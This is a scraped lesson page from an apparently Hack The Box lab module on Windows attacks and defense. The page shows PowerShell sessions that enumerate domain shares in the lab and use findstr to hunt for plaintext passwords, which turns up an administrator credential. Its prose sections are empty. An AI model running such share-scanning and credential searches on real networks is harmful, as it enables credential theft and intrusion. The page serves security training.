<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/176/section/1782
// Platform Version: V1
// Module ID: 176
// Module Name: Windows Attacks & Defense
// Module Difficulty: Medium
// Section ID: 1782
// Section Title: Credentials in Shares
// Page Title: Windows Attacks & Defense
// Page Number: 07
-->

# Credentials in Shares

**Module Name:** Windows Attacks & Defense **Page Number:** 07

#### WINDOWS ATTACKS & DEFENSE

# Credentials in Shares

## Description

## Attack

```powershell-session
PS C:\Users\bob\Downloads> Invoke-ShareFinder -domain eagle.local -ExcludeStandard -CheckShareAccess

\\DC2.eagle.local\NETLOGON      - Logon server share
\\DC2.eagle.local\SYSVOL        - Logon server share
\\WS001.eagle.local\Share       -
\\WS001.eagle.local\Users       -
\\Server01.eagle.local\dev$     -
\\DC1.eagle.local\NETLOGON      - Logon server share
\\DC1.eagle.local\SYSVOL        - Logon server share
```

![https://academy.hackthebox.com/storage/modules/176/A5/sharescan.png](https://academy.hackthebox.com/storage/modules/176/A5/sharescan.png)

![https://academy.hackthebox.com/storage/modules/176/A5/sharefileless.png](https://academy.hackthebox.com/storage/modules/176/A5/sharefileless.png)

![https://academy.hackthebox.com/storage/modules/176/A5/sharecontent.png](https://academy.hackthebox.com/storage/modules/176/A5/sharecontent.png)

```powershell-session
PS C:\Users\bob\Downloads> cd \\Server01.eagle.local\dev$
PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$> findstr /m /s /i "pass" *.bat
PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$> findstr /m /s /i "pass" *.cmd
PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$> findstr /m /s /i "pass" *.ini
setup.ini
PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$> findstr /m /s /i "pass" *.config
4\5\4\web.config
```

![https://academy.hackthebox.com/storage/modules/176/A5/scan1.png](https://academy.hackthebox.com/storage/modules/176/A5/scan1.png)

```powershell-session
PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$> findstr /m /s /i "pw" *.config

5\2\3\microsoft.config
PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$> findstr /s /i "pw" *.config
5\2\3\microsoft.config:pw BANANANANANANANANANANANANNAANANANANAS
```

![https://academy.hackthebox.com/storage/modules/176/A5/scan2.png](https://academy.hackthebox.com/storage/modules/176/A5/scan2.png)

```powershell-session
PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$> findstr /m /s /i "eagle" *.ps1

2\4\4\Software\connect.ps1
PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$> findstr /s /i "eagle" *.ps1
2\4\4\Software\connect.ps1:net use E: \\DC1\sharedScripts /user:eagle\Administrator Slavi123
```

![https://academy.hackthebox.com/storage/modules/176/A5/scan3.png](https://academy.hackthebox.com/storage/modules/176/A5/scan3.png)

## Prevention

## Detection

![https://academy.hackthebox.com/storage/modules/176/A5/Detect4624.png](https://academy.hackthebox.com/storage/modules/176/A5/Detect4624.png)

![https://academy.hackthebox.com/storage/modules/176/A5/Detect4768.png](https://academy.hackthebox.com/storage/modules/176/A5/Detect4768.png)

## Honeypot

![https://academy.hackthebox.com/storage/modules/176/A5/honeypot4dot3.png](https://academy.hackthebox.com/storage/modules/176/A5/honeypot4dot3.png)

![https://academy.hackthebox.com/storage/modules/176/A5/honeypot4.png](https://academy.hackthebox.com/storage/modules/176/A5/honeypot4.png)

![https://academy.hackthebox.com/storage/modules/176/A5/honeypot4dot2.png](https://academy.hackthebox.com/storage/modules/176/A5/honeypot4dot2.png)

# 

# 

#### Questions

####